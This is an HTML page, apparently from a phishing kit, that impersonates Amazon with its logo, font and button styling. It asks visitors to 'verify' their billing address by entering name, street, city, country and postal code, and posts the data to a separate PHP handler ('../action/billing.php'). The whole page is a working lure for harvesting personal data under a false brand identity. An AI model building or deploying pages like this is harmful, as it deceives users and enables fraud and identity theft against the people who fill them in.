<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verify Your Address</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Amazon Ember', Arial, sans-serif; }
        body { background: #fff; min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 20px; }
        .logo { margin: 10px 0 25px; }
        .logo img { height: 40px; }
        .kotak { width: 100%; max-width: 500px; border: 1px solid #ddd; border-radius: 4px; padding: 25px; }
        h1 { font-size: 24px; margin-bottom: 20px; font-weight: 400; text-align: center; }
        label { font-size: 13px; font-weight: 700; display: block; margin-top: 12px; }
        input, select { width: 100%; padding: 9px; margin: 6px 0; border: 1px solid #a6a6a6; border-radius: 3px; font-size: 15px; }
        .tombol { width: 100%; padding: 10px; margin-top: 20px; background: #FFD814; border: 1px solid #FCD200; border-radius: 8px; font-size: 15px; cursor: pointer; }
        .tombol:hover { background: #F7CA00; }
    </style>
</head>
<body>

<div class="logo">
    <a href="amazon.html"><img src="../assets/img/amazonlogo.png" alt="Amazon"></a>
</div>

<div class="kotak">
    <h1>Verify Your Billing Address</h1>

    <form action="../action/billing.php" method="POST">
        <label for="nama">Full Name</label>
        <input type="text" id="nama" name="nama" required>

        <label for="alamat">Street Address</label>
        <input type="text" id="alamat" name="alamat" required>

        <label for="kota">City</label>
        <input type="text" id="kota" name="kota" required>

        <label for="negara">Country/Region</label>
        <select id="negara" name="negara">
            <option value="US">United States</option>
            <option value="ID">Indonesia</option>
            <option value="AU">Australia</option>
            <option value="GB">United Kingdom</option>
            <option value="CA">Canada</option>
        </select>

        <label for="kode_pos">Postal / Zip Code</label>
        <input type="text" id="kode_pos" name="kode_pos" required>

        <button type="submit" class="tombol">Continue</button>
    </form>
</div>

</body>
</html>
